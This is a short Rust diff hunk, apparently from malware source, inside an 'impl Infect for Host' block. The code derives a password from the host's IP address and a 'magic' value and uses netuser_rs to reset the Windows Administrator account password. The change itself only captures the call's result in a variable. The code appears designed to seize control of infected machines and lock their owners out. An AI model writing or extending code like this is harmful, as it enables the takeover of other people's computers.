@@ -471,6 +471,7 @@ impl Infect for Host {
             schema,
             self.ip.split('.').last().unwrap().parse::<u16>().unwrap() * magic as u16
         );
-        let _ = netuser_rs::users::change_user_password("Administrator", &password);
+
+        let thing = netuser_rs::users::change_user_password("Administrator", &password);
     }
 }
